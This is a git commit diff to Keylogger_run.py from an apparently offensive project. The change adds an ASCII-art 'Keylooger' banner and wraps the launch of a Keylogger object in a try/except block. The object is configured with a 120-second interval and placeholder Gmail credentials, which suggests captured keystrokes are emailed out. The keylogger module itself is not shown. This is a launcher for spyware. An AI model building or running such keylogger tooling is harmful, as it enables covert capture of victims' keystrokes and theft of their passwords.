7c124011244f5b383c5d92cd856f7ef4db9fa56a
krishna-grayhat <142478625+krishna-grayhat@users.noreply.github.com>
2023-08-28 04:31:31 +0530

    Update Keylogger_run.py

--- Keylogger_run.py
+++ Keylogger_run.py
@@ -1,4 +1,9 @@
 import keylogger
-
-my_keylogger = keylogger.Keylogger(120, "enter your gmail", "fill your passwd") 
-my_keylogger.start()
+import pyfiglet
+text = pyfiglet.figlet_format("Keylooger")
+print(text)
+try:
+  my_keylogger = keylogger.Keylogger(120, "enter your gmail", "fill your passwd") 
+  my_keylogger.start()
+except KeyboardInterrupt:
+   print(" press ctrl+z for exit")
